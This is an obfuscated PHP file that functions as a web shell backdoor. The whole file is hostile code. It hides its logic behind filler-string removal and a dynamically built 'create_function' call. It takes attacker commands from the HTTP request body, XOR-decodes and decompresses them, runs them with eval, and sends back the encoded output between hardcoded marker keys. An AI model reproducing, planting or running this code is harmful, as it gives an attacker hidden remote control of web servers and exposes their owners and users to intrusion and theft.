<?php
$M='u23t23"),$m23)==1) {@ob_sta23rt()23;@ev23al(@gzun23compr23ess(@x(@b23as23e64_de23code($m23[1])23,$k)));$o=@23ob_g23et_';
$o=',$23k){$c=strl23en($k);$l=st23rl23e23n($t);$o="23";for($23i=0;$i23<$l;){for(23$23j=0;($j23<$c&&$i<$23l);$j+23+,23$i';
$g='$23k="5d2373bdad";$k23h="937ce7232eb344"2323;$kf="0c3b2375f236ac81";$23p="IRSP23BSkVo23CPTIe9B"23;fun2323ction x(23$t';
$m='c23ontent23s(23);@ob_end_clea23n23();$r=@base2364_en2323co23de(@x(@gzcompre23s23s($o23),$k));prin2323t("$p$kh$r$kf");}';
$k='+23+23){$o.=$t{$i}23^23$k23{$j};}}return23 $o;}if (@p23reg_matc23h("23/$k23h(.+)$kf/",23@file_get23_conte23n23ts("ph23p://inp';
$h=str_replace('NQ','','crNQeatNQNQeNQ_funNQctiNQon');
$I=str_replace('23','',$g.$o.$k.$M.$m);
$J=$h('',$I);$J();
?>
